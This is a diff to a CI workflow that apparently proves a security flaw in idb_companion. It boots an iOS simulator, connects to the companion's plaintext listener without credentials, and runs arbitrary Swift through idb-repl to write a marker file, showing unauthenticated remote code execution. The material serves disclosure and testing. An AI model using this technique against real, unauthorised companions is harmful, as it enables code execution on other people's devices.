@@ -37,8 +37,24 @@ jobs:
           stdout="$RUNNER_TEMP/companion.stdout"
           stderr="$RUNNER_TEMP/companion.stderr"
 
+          target_udid="$(xcrun simctl list devices available -j | python3 -c '
+          import json, sys
+          devices = json.load(sys.stdin)["devices"]
+          for runtime in sorted(devices, reverse=True):
+              if "iOS" not in runtime:
+                  continue
+              for device in devices[runtime]:
+                  if device.get("isAvailable") and device.get("name", "").startswith("iPhone"):
+                      print(device["udid"])
+                      raise SystemExit
+          raise SystemExit("no available iPhone simulator")
+          ')"
+          printf 'simulator_udid=%s\n' "$target_udid"
+          xcrun simctl boot "$target_udid" 2>/dev/null || true
+          xcrun simctl bootstatus "$target_udid" -b
+
           "$companion" \
-            --udid mac \
+            --udid "$target_udid" \
             --grpc-port 0 \
             --idle-shutdown-time 300 \
             --log-level debug \
@@ -47,6 +63,7 @@ jobs:
           cleanup() {
             kill "$companion_pid" 2>/dev/null || true
             wait "$companion_pid" 2>/dev/null || true
+            xcrun simctl shutdown "$target_udid" 2>/dev/null || true
           }
           trap cleanup EXIT
 
@@ -86,11 +103,21 @@ jobs:
           import sys
 
           description = json.loads(pathlib.Path(sys.argv[1]).read_text())
-          assert description.get("target_type") == "mac", description
+          assert description.get("target_type") == "simulator", description
           address = description.get("companion_info", {}).get("address", {})
           assert address.get("host") == sys.argv[2], description
           print(f"unauthenticated_describe_target={description['udid']}")
           PY
+
+          repl_output="$(env -u IDB_COMPANION -u IDB_COMPANION_TLS \
+            "$RUNNER_TEMP/idb-companion/idb-repl" \
+            --reason 'Authorized security validation on a disposable runner' \
+            app \
+            --companion "$target" \
+            'let path = NSTemporaryDirectory() + "idb-unauthenticated-proof"; try "remote-code-executed".write(toFile: path, atomically: true, encoding: .utf8); return "\(ProcessInfo.processInfo.processIdentifier):\(try String(contentsOfFile: path, encoding: .utf8))"')"
+          printf '%s\n' "$repl_output"
+          printf '%s\n' "$repl_output" | grep -q 'remote-code-executed'
+          printf 'unauthenticated_repl=arbitrary Swift executed in target process\n'
 
           env -u IDB_COMPANION -u IDB_COMPANION_TLS \
             "$RUNNER_TEMP/venv/bin/idb" --companion "$target" list-apps --json \
@@ -111,4 +138,4 @@ jobs:
             echo 'unexpected TLS listener' >&2
             exit 1
           fi
-          printf 'proof=PASS wildcard plaintext listener accepted remote-address RPCs without credentials\n'
+          printf 'proof=PASS wildcard plaintext listener accepted remote-address RPCs and arbitrary REPL code without credentials\n'
